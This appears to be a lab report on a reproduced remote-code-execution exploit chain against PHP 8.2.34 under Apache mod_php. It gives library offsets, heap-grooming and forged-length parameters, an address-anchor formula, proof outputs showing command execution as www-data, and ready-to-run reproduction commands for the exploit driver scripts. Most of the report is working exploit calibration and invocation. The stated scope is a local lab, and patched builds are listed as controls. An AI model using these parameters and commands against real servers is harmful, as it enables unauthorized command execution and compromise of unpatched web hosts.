# PHP 8.2.34 mod_php — engine-level RCE (PHP2SHELL)

**Status: SOLID — reproduced.**
Command execution as `www-data` on stock `php:8.2.34-apache` (mod_php,
`php.ini-production`, 128M memory limit) through the pure-HTTP
CVE-2026-109618/109619 engine chain. 8.2.34 is the last affected release of
the 8.2 branch; 8.2.35 is the fixed release (negative control in `lab-8235`).

| | |
|---|---|
| Target image | `php@sha256:1650dcb528360aad05d6ed2f83cb403a2a39c31bd14552efd9a747b2207dea86` (`php:8.2.34-apache`) |
| libphp.so SHA-256 | `42ae9f69550e036ff5ad3d25d7ebf6b40bf2dd6531e8f891de53bea0d1663e9b` |
| Offsets | `zif_system=0x39B8A0`, `zval_ptr_dtor=0x487650`, `php_session_reset_id=0x347CB0` |
| Lab container | `p2s-8234`, `127.0.0.1:18134` |
| Apache | single worker (`StartServers 1`, `MaxRequestWorkers 1`, `ServerLimit 1`) |
| Date | 2026-10-23 |

## Verdict

The 8.3.29 geometry transfers to 8.2.34 unchanged: A1 progress `1000`, B1
spec `G:300:0xE2 ×16 + X:900`, fake length `0xC8000`, page offset `0x968`,
decoded window `819208`, and the dtor-anchored carrier relation

```
S = (zval_ptr_dtor & ~0x1FFFFF) - 0x2000000 + 0xF9398
```

Six chain executions across four fresh ASLR instances all succeeded on the
first chain attempt. The one-shot driver selected `PHP/8.2` from the banner
and ran three commands in a single session (proof + two interactive).

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
Linux 5.15.153.1-microsoft-standard-WSL2
www-data
```

## Proof runs

| # | Context | Command | Output | Evidence |
|---|---|---|---|---|
| 1 | fresh ASLR | `id` | `uid=33(www-data) ...` | `evidence/chain-8234-try1.log`, `evidence/proof-chain1-id.txt` |
| 2 | fresh ASLR | `uname -sr` | `Linux 5.15.153.1-microsoft-standard-WSL2` | `evidence/chain-8234-run2.log`, `evidence/proof-chain2-uname.txt` |
| 3 | fresh ASLR | `whoami; ls -la /out` | `www-data` + listing | `evidence/chain-8234-run3.log`, `evidence/proof-chain3-whoami-ls.txt` |
| 4 | one-shot, profile proof | `id` | `uid=33(www-data) ...` | `evidence/oneshot-8234-session.log`, `evidence/proof-oneshot-id.txt` |
| 5 | one-shot, interactive | `id` | `uid=33(www-data) ...` | `evidence/proof-oneshot-interactive-id.txt` |
| 6 | one-shot, interactive | `uname -sr` | `Linux 5.15.153.1-microsoft-standard-WSL2` | `evidence/proof-oneshot-uname.txt` |

All six were `[try 1/3]`. Runs 4–6 were three consecutive chains on the same
child, same ASLR addresses, no restart.

## Chain parameters (8.2.34)

| Stage | Parameter | Value |
|---|---|---|
| A1 | progress length | `1000` → `HTTP/1.0 500`, 211 B, no cookie |
| B1 | spec | `G:300:0xE2 ×16 + X:900` |
| | forged length / page offset | `0xC8000` / `0x968` |
| | decoded / `Set-Cookie` | `819208` / ~1.27 MB |
| S | anchor | `(zval_ptr_dtor & ~0x1FFFFF) - 0x2000000 + 0xF9398` |
| | fake HashTable offset | `0xF9398` in the carrier chunk |
| A2 | grooming | `parts=880`, `depth=64`, `fillers=115` |
| B2 | fake reference | `vl=384`, `n1=500`, `n2=495`, `rc=1` |

No gdb recalibration was required: the successful destructor call proves the
fake array landed at `S` on every run.

## Driver behavior

`oneshot-8426/exploit.py` now carries `PHP/8.2` profile plus
`PROFILE_FOR_BUILD = {"8.2.34": "8.2", ...}` and
`CALIBRATED_BUILDS = {"8.2.34", "8.3.29", "8.4.26"}`. A target reporting
`PHP/8.2.34` is routed straight to the 8.2 profile; other 8.2.x builds below
8.2.35 remain `affected-uncalibrated` and are not attempted (no profile).

## Evidence

- `evidence/leak-8234.log` — A1/B1 leak with 8.2.34 offsets
- `evidence/chain-8234-*.log` — three fresh-ASLR chain runs
- `evidence/oneshot-8234-session.log` — URL-only driver, three commands
- `evidence/proof-*.txt` — six command outputs
- `evidence/symbols.txt`, `evidence/libphp-sha256.txt`, `evidence/image-digest.txt`

## Reproduction

Raw chain:

```sh
SPEC=$(python3 -c "print(','.join(['G:300:0xE2']*16+['X:900']))")
python3 ../oneshot-8426/pure_shell.py \
  --host 127.0.0.1 --port 18134 --path /index.php --outdir ./out \
  --zif 0x39b8a0 --dtor 0x487650 --a1-progress 1000 \
  --b1-fake-len 0xC8000 --b1-spec "$SPEC" --b1-page-off 0x968 \
  --s-mode dtor --dtor-anchor=-0x2000000 --fake-array-delta 0xF9398 \
  --exec 'id'
```

URL-only one-shot:

```sh
printf 'http://127.0.0.1:18134/index.php\nid\nuname -sr\nexit\n' | \
  P2S_OUTDIR=$PWD/out python3 ../oneshot-8426/exploit.py
```

Scope: local lab only. 8.2.34 is affected (`< 8.2.35`); 8.2.35 is the fixed
control. Patched builds (8.2.35+, 8.3.36+, 8.4.27+, 8.5.12+) are rejected at
preflight.
